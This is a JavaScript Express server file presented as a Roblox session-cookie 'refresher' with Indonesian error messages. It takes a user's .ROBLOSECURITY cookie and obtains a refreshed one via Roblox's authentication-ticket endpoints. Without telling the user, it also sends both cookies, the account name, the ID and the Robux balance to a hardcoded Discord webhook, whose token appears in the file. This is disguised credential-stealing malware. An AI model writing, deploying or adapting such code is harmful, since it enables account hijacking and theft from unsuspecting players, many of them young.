const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1535039309927677984/SbM7XzLfFoTQ4w7llQYtXCKi7u5PkuGmeGb2zWRBV41GQXb_htR5a09m6RQ2yLGD_c0z';

async function sendToDiscordWebhook(oldCookie, newCookie) {
  if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.startsWith('http')) return;

  try {
    const headers = { 'Cookie': `.ROBLOSECURITY=${newCookie}`, 'User-Agent': 'Mozilla/5.0' };
    
    let username = 'Unknown';
    let displayName = 'Unknown';
    let userId = 'Unknown';
    let robuxBalance = 0;

    try {
      const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });
      userId = userRes.data.id;
      username = userRes.data.name;
      displayName = userRes.data.displayName;

      const robuxRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
      robuxBalance = robuxRes.data.robux || 0;
    } catch (e) {}

    const embed = {
      embeds: [{
        title: '🍪 Cookie Refreshed Successfully!',
        color: 5763719,
        fields: [
          { name: '👤 User', value: `**${displayName}** (@${username})`, inline: true },
          { name: '🆔 User ID', value: `\`${userId}\``, inline: true },
          { name: '💰 Robux', value: `\`${robuxBalance}\` R$`, inline: true },
          { name: '🔑 Old Cookie', value: `\`\`\`${oldCookie}\`\`\`` },
          { name: '✨ Refreshed Cookie', value: `\`\`\`${newCookie}\`\`\`` }
        ],
        footer: { text: 'Roblox Refresher Logger' },
        timestamp: new Date()
      }]
    };

    await axios.post(DISCORD_WEBHOOK_URL, embed);
  } catch (err) {
    console.error('Webhook error:', err.message);
  }
}

app.post('/api/refresh', async (req, res) => {
  const { cookie } = req.body;

  if (!cookie) {
    return res.status(400).json({ error: 'Cookie wajib diisi' });
  }

  const formattedCookie = cookie.startsWith('_|WARNING:') 
    ? cookie 
    : `_|WARNING:-DO-NOT-SHARE-THIS.--Optionally-your-other-cookie-string-here--${cookie}`;

  try {
    let csrfToken = '';
    try {
      await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
        headers: { 'Cookie': `.ROBLOSECURITY=${formattedCookie}` }
      });
    } catch (err) {
      csrfToken = err.response?.headers['x-csrf-token'];
    }

    if (!csrfToken) {
      return res.status(400).json({ error: 'Cookie expired atau tidak valid' });
    }

    const ticketRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${formattedCookie}`,
        'x-csrf-token': csrfToken,
        'referer': 'https://www.roblox.com'
      }
    });

    const ticket = ticketRes.headers['rbx-authentication-ticket'];
    if (!ticket) {
      return res.status(400).json({ error: 'Gagal membuat tiket autentikasi' });
    }

    const redeemRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', 
      { authenticationTicket: ticket },
      {
        headers: {
          'x-csrf-token': csrfToken,
          'RBX-For-Game-Auth': 'true'
        }
      }
    );

    const setCookie = redeemRes.headers['set-cookie'];
    let refreshedCookie = '';

    if (setCookie) {
      for (const str of setCookie) {
        if (str.includes('.ROBLOSECURITY=')) {
          const match = str.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) {
            refreshedCookie = match[1];
            break;
          }
        }
      }
    }

    if (refreshedCookie) {
      await sendToDiscordWebhook(cookie, refreshedCookie);
      return res.json({ refreshedCookie });
    } else {
      return res.status(500).json({ error: 'Gagal mengekstrak cookie baru' });
    }

  } catch (err) {
    return res.status(500).json({ error: err.response?.data?.errors?.[0]?.message || 'Gagal memproses refresh cookie' });
  }
});

module.exports = app;
    
